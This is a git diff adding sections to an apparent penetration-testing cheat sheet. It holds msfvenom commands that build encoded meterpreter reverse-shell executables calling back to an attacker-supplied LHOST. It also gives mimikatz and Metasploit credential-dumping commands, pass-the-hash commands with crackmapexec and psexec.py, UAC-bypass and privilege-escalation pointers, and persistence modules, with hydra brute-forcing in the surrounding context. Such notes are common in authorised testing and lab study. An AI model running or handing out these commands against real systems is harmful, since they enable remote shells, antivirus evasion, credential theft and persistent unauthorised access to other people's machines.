@@ -103,18 +103,62 @@ hydra -L /usernamePathfile/ -P /passPATHfile/ -t4 <ip> ftp
 smbclient -u username -p pass -H <ip>
 enum4linux -a -u username -p pass <ip>
 ```
+## Msfvenom:
+```
+Windows:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<Your Port> -f exe > reverse.exe
+Encoder:
+msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
+
+Linux:
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<Your Port> -f elf > reverse.elf
+Encoder:
+msfvenom -p linux/x86/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f elf > encoded.exe
+```
 
 ## Windows Privilege Esclations:
 ```
-# windows kernel   ===> use suggester module in metasploit
-# By Passing UAC   ===> use UAC tool / or use bypassuac_injections module in metasploit
-# Access Token Impersonation
+# Windows kernel             ===> use suggester module in metasploit
+# By Passing UAC             ===> use UAC tool / or use bypassuac_injections module in metasploit
+# Access Token Impersonation ===> load incognito 
  ```
 ## linux Pruvilege Esclations:
 ```
-
-
+# Misconfigured Cron Jobs
+# Suid Binaries
+# Weak Permissions
+# Sudo
 ```
+## Windows Credential Dumping:
+```
+dump with mimikatz
+# privilege::debug
+# lsadump::sam 
+# lsadump::secrets
+```
+## Linux Credential Dumping:
+```
+use MSF module ===>  modules/post/linux/gather/hashdump
+```
+## Pass The Hash:
+```
+crackmapexec smb <ip> -u username -H "NTLMHash"
+psexec.py username@<ip> -hashes:
+```
+## Windows Persistence:
+```
+# windows service
+ use MSF module ===> windows/local/persistence_service
+```
+## Linux Persistence:
+```
+# sshkey persistence
+use MSF module ===> post/linux/manage/sshkey_persistence 
+```
+
+
+
+
 
 
 
